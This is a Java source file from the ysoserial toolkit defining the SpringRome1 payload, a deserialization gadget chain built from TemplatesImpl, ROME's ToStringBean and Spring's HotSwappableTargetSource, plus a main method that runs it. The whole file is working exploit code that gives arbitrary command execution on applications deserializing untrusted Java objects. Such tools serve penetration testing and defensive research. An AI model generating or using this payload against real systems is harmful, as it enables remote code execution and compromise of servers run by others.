package ysoserial.payloads;

import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.springframework.aop.target.HotSwappableTargetSource;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import javax.xml.transform.Templates;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.HashMap;

@Authors({ Authors.F4NX1NG })
public class SpringRome1 implements ObjectPayload<Object>{
    public Object getObject ( String command) throws Exception {
        Object o = Gadgets.createTemplatesImpl(command);

        ToStringBean toStringBean = new ToStringBean(Templates.class, o);
        //        toStringBean.toString();

        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("xxx"));

        return Gadgets.makeMap(h1, h2);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(SpringRome1.class, args);
    }
}
